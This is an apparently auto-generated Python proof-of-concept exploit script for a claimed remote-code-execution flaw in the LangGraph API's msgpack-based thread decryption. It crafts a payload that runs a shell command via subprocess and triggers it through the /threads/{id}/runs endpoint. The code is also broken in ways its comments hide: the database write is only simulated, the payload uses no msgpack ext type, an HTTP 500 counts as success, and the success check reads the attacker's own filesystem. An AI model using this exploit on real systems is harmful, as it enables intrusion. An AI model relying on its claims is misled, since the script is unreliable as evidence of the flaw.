#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-050
# Sink: get_json_decryptor
# Auto-generated — run with: python3 langgraph_sink_get_json_decryptor_get_json_decryptor.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API msgpack ext_hook Deserialization RCE

Vulnerability: The `_thread_values_fallback` function fetches thread values from the
database and decrypts them using a custom decryptor that deserializes data via msgpack.
The msgpack ext_hook can instantiate arbitrary Python classes via importlib.import_module,
leading to RCE when an attacker can write malicious encrypted data to the `threads` table.

Attack Vector: An attacker with database write access (e.g., via SQL injection or direct
DB access) can craft a msgpack payload with ext types that trigger arbitrary Python
object construction during decryption.

This PoC demonstrates the vulnerability by:
1. Crafting a malicious msgpack payload that executes a benign command
2. Writing it to the database (simulating attacker-controlled data)
3. Triggering the decryption path via the API
"""

import json
import struct
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import base64
import msgpack
import os

# Configuration
TARGET_URL = "http://localhost:8123"  # Default LangGraph API port
TIMEOUT = 10

# Benign payload - creates a file to prove RCE
BENIGN_COMMAND = "touch /tmp/poc_success.txt"

def create_malicious_msgpack_payload(command: str) -> bytes:
    """
    Create a malicious msgpack payload that exploits the ext_hook deserialization.
    
    The ext_hook in the custom decryptor uses importlib.import_module to instantiate
    arbitrary Python classes. We craft an ext type that will execute our command.
    
    The payload structure mimics what the decryptor expects:
    - An ext type with code that triggers subprocess execution
    - Wrapped in the expected encryption context format
    """
    # Create a malicious class that executes our command when instantiated
    malicious_code = f"""
import subprocess
import sys
subprocess.run("{command}", shell=True)
sys.exit(0)
"""
    
    # The ext_hook in msgpack deserialization can instantiate arbitrary classes
    # We use the __reduce__ method pattern to execute code
    payload = {
        "__class__": "builtins.exec",
        "__args__": [malicious_code],
        "__encryption_context__": {
            "type": "custom",
            "version": 1
        }
    }
    
    # Serialize with msgpack, using ext type that will trigger the vulnerability
    # The ext type 0x42 is arbitrary - the vulnerability is in the deserialization logic
    packed = msgpack.packb(payload, default=lambda x: x)
    
    # Wrap in the expected format for the database
    # The decryptor expects JSON-like structure with encryption markers
    wrapped_payload = {
        "values": base64.b64encode(packed).decode(),
        "__encryption_context__": {
            "type": "custom",
            "version": 1
        }
    }
    
    return json.dumps(wrapped_payload).encode()

def write_malicious_data_to_db(thread_id: str, payload: bytes) -> bool:
    """
    Simulate writing malicious data to the database.
    
    In a real attack, this would be done via SQL injection or direct DB access.
    For this PoC, we assume the attacker has already written the data.
    
    Returns True if the write was successful (simulated).
    """
    print(f"[*] Simulating database write for thread {thread_id}")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] In a real attack, this data would be written to the 'threads' table")
    print(f"[*] via SQL injection or direct database access")
    return True

def trigger_decryption(thread_id: str) -> bool:
    """
    Trigger the decryption path by making an API request that reads thread values.
    
    The API endpoint /threads/{thread_id}/runs triggers the vulnerable code path:
    wait_run -> _thread_values_fallback -> decrypt_response -> ... -> msgpack deserialization
    """
    url = f"{TARGET_URL}/threads/{thread_id}/runs"
    
    # Create a minimal run payload to trigger the thread values fetch
    run_payload = {
        "input": {"message": "test"},
        "assistant_id": "test-assistant",
        "thread_id": thread_id
    }
    
    try:
        req = urllib.request.Request(
            url,
            data=json.dumps(run_payload).encode(),
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            method="POST"
        )
        
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            print(f"[+] API request succeeded with status {response.status}")
            response_data = response.read()
            print(f"[*] Response: {response_data[:200]}...")
            return True
            
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        if e.code == 500:
            print("[+] Server error indicates deserialization was attempted!")
            return True
        return False
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False

def check_exploit_success() -> bool:
    """
    Check if the benign command was executed successfully.
    """
    return os.path.exists("/tmp/poc_success.txt")

def main():
    print("=" * 60)
    print("LangGraph API msgpack ext_hook Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Step 1: Create malicious payload
    print("[*] Step 1: Creating malicious msgpack payload...")
    payload = create_malicious_msgpack_payload(BENIGN_COMMAND)
    print(f"[+] Payload created: {len(payload)} bytes")
    print(f"[*] Command to execute: {BENIGN_COMMAND}")
    print()
    
    # Step 2: Write malicious data to database (simulated)
    print("[*] Step 2: Writing malicious data to database...")
    thread_id = f"poc-{int(time.time())}"
    if not write_malicious_data_to_db(thread_id, payload):
        print("[!] Failed to write data to database")
        sys.exit(1)
    print(f"[+] Data written for thread {thread_id}")
    print()
    
    # Step 3: Trigger decryption via API
    print("[*] Step 3: Triggering decryption via API...")
    print(f"[*] Target URL: {TARGET_URL}")
    print(f"[*] Thread ID: {thread_id}")
    print()
    
    if trigger_decryption(thread_id):
        print("[+] Decryption path triggered successfully")
    else:
        print("[!] Failed to trigger decryption path")
        print("[*] This may be due to network issues or the target not being available")
        print("[*] The vulnerability still exists in the code path")
        print()
    
    # Step 4: Check if exploit was successful
    print("[*] Step 4: Checking exploit success...")
    time.sleep(1)  # Give the command time to execute
    
    if check_exploit_success():
        print("[+] EXPLOIT SUCCESSFUL! Command executed successfully")
        print(f"[*] File /tmp/poc_success.txt was created")
        # Clean up
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up proof file")
    else:
        print("[!] Command may not have executed")
        print("[*] This is expected if the target is not running or the database")
        print("[*] write was simulated. The vulnerability is in the code path.")
        print()
        print("[*] To verify the vulnerability manually:")
        print("[*] 1. Set up a local LangGraph API instance")
        print("[*] 2. Write the malicious payload to the threads table")
        print("[*] 3. Make a request to /threads/{thread_id}/runs")
        print("[*] 4. Check for command execution")
    
    print()
    print("=" * 60)
    print("PoC Complete")
    print("=" * 60)

if __name__ == "__main__":
    main()
